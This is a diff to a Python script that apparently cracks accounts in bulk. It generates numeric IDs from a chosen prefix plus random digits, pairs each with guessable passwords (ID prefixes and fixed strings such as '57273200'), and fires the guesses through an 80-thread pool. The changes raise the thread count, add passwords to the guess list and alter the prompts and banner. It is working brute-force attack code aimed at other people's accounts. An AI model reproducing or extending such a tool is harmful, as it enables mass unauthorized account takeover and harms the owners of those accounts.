@@ -418,21 +418,24 @@ def cracker(ids,passlist):
 def mainn():
     os.system('clear')
     print(logo)
-    code = input(f'{Y}[{W}~{Y}] {G}Choice code {W}: ') 
-    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
+    code = input(f"{Y}[{W}~{Y}] {G}ENTER 4 DIGUT CODE {W}: ")
+    #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
+   # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
+    #code = random.choice([code1,code2,code3])
+    limit = input(f'{Y}[{W}~{Y}] {G}ENTER TOTAL LIMID {W}: ')
     for a in range(int(limit)):
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
-    with ThreadPoolExecutor(max_workers=60) as Submits:
+    with ThreadPoolExecutor(max_workers=80) as Submits:
         os.system('clear')
-        print(47*"\x1b[1;97m+")
+        print("\x1b[1;97m━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━❤️❥❥═════") 
         for next in gen:
             ids = code + next
             mk = ids[:6]
             xx = ids[:7]
             v = ids[:8]
             b = next[:6]  
-            passlist = [mk,xx,'57273200',v]
+            passlist = [mk,xx,'57273200',v,'57575751','57575752']
             Submits.submit(crackerr,ids,passlist)
 
 def convert(cookie):
